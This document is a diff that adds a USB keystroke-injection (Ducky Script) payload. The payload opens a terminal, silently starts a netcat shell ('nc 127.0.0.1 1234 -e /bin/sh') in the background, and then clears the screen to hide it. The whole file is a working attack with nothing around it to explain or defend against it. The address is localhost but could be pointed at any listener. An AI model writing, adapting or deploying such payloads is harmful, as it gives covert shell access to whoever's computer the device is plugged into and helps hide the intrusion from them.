@@ -1,0 +1,7 @@
+REM THESE IS A COMMENT
+CONTROL ALT t
+DELAY 1000
+STRING nc 127.0.0.1 1234 -e /bin/sh &>/dev/null &
+ENTER
+STRING clear
+ENTER
